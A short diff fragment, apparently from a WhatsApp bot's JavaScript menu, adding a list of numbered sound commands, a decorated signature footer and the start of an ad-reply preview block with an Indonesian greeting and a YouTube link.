+╠➤zaffsound135
+╠➤zaffsound136
+╠➤zaffsound137
+╠➤zaffsound138
+╠➤zaffsound139
+╠➤zaffsound140
+╠➤zaffsound141
+╠➤zaffsound142
+╠➤zaffsound143
+╠➤zaffsound144
+╠➤zaffsound145
+╠➤zaffsound146
+╠➤zaffsound147
+╠➤zaffsound148
+╠➤zaffsound149
+╠➤zaffsound150
+╠➤zaffsound151
+╠➤zaffsound152
+╠➤zaffsound153
+╠➤zaffsound154
+╠➤zaffsound155
+╠➤zaffsound156
+╠➤zaffsound157
+╠➤zaffsound158
+╠➤zaffsound159
+╠➤zaffsound160
+╠➤zaffsound161
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
